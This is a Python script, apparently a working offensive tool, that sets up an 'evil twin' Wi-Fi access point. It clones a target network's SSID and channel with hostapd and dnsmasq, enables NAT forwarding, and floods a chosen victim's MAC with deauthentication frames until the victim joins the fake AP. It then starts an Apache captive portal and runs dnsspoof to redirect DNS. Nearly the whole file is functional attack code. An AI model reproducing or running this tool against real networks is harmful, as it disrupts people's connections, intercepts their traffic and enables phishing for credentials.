import subprocess, time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq
from threading import Thread, Event
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from pathlib import Path

# Event to stop deauth thread
_deauth_stop = Event()


def create_evil_ap(ap_info, ap_iface, uplink_iface="eth0", output_dir="."):
    """
    - ap_info: dict with keys 'SSID' and 'Channel'
    - ap_iface: e.g. 'wlan0mon'
    - uplink_iface: your internet‐connected interface, default 'eth0'
    - output_dir: where to write hostapd.conf & dnsmasq.conf
    """

    ssid    = ap_info['SSID']
    channel = ap_info['Channel']

    # 1) Load templates (in cwd)
    hostapd_tmpl = Path("template_hostapd.conf").read_text()
    dnsmasq_tmpl = Path("template_dnsmasq.conf").read_text()

    # 2) Replace our placeholders
    hostapd_conf = (
        hostapd_tmpl
        .replace("[INTERFACE NAME]", ap_iface)
        .replace("[WIFI NAME]", ssid)
        .replace("[CHANNEL NAME]", str(channel))
    )

    dnsmasq_conf = dnsmasq_tmpl.replace("[INTERFACE NAME]", ap_iface)

    # 3) Write out the real configs
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "hostapd.conf").write_text(hostapd_conf)
    (out_dir / "dnsmasq.conf").write_text(dnsmasq_conf)
    print(f"Written {out_dir/'hostapd.conf'} and {out_dir/'dnsmasq.conf'}")

    cmds = [
        # 4) Routing Table & Gateway
        # assigns IP .1 to the monitor interface 
        ["ifconfig", ap_iface, "up", "192.168.1.1", "netmask", "255.255.255.0"],
        # ensures traffic for 192.168.1.x goes via .1
        ["route", "add", "-net", "192.168.1.0", "netmask", "255.255.255.0", "gw", "192.168.1.1"],

        # 5) Enabling Internet Access (NAT)
        # NAT: masquerade outgoing traffic on eth0
        ["iptables", "--table", "nat", "--append", "POSTROUTING",
         "--out-interface", uplink_iface, "-j", "MASQUERADE"],
        # allow forwarding from Wi‑Fi to Ethernet
        ["iptables", "--append", "FORWARD",
         "--in-interface", ap_iface, "-j", "ACCEPT"],

        # enable IPv4 packet forwarding
        ["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
    ]

    for cmd in cmds:
        print("Running:", " ".join(cmd))
        subprocess.run(cmd, check=True)

    print("\nAP interface configured, NAT enabled.")


def _deauth_loop(real_bssid, victim_mac, iface):
    """Continuously send deauth frames in chunks until stopped."""
    pkt = RadioTap()/Dot11(addr1=victim_mac, addr2=real_bssid, addr3=real_bssid)/Dot11Deauth(reason=7)
    while not _deauth_stop.is_set():
        # Send a burst of 50 deauth packets
        for _ in range(50):
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.1)
        # Pause before next burst
        time.sleep(0.5)


def deauth_victim(ap_info, victim_mac, iface):
    """
    Start deauth attack and stop when victim associates to the Evil AP.
    Sends 50 deauth frames, waits 0.5s, repeats until association detected.
    """
    real_bssid = ap_info['BSSID']
    print(f"Starting deauth attack on {victim_mac}...")
    _deauth_stop.clear()
    # Launch deauth loop
    t = Thread(target=_deauth_loop, args=(real_bssid, victim_mac, iface), daemon=True)
    t.start()

    # Sniff for the victim's association to the Evil AP
    def assoc_filter(pkt):
        return pkt.haslayer(Dot11AssoReq) and pkt.addr2 == victim_mac and pkt.addr1 == real_bssid

    def assoc_handler(pkt):
        print(f"Detected association from {victim_mac} to Evil AP {real_bssid}. Stopping deauth.")
        _deauth_stop.set()

    # Blocks until assoc_filter returns True
    sniff(iface=iface, prn=assoc_handler, stop_filter=assoc_filter)
    t.join()
    print(f"Deauth attack ended for {victim_mac}")


def start_captive_portal():
    """
    Starts Apache to serve the captive-portal pages.
    """
    try:
        print("Starting Apache2 service for captive portal…")
        subprocess.run(
            ["service", "apache2", "start"],
            check=True
        )
        print("Apache2 started successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to start Apache2: {e}")


def start_attack(ap_iface,
                 hostapd_conf="hostapd.conf",
                 dnsmasq_conf="dnsmasq.conf"):
    """
    Launches the fake AP (hostapd), DHCP/DNS server (dnsmasq), and DNS spoofer (dnsspoof).
    Returns the Popen handles so you can terminate them later if needed.
    """
    procs = {}
    try:
        print("Launching hostapd…")
        procs['hostapd'] = subprocess.Popen(
            ["hostapd", hostapd_conf]
        )

        print("Launching dnsmasq…")
        procs['dnsmasq'] = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_conf, "-d"]
        )

        print(f"Launching dnsspoof on interface {ap_iface}…")
        procs['dnsspoof'] = subprocess.Popen(
            ["dnsspoof", "-i", ap_iface]
        )

        print("Attack started:")
        for name, p in procs.items():
            print(f"  • {name} (PID {p.pid})")

    except Exception as e:
        print(f"Error launching attack components: {e}")
        # If something fails, clean up any started processes
        for p in procs.values():
            p.terminate()
        raise

    return procs
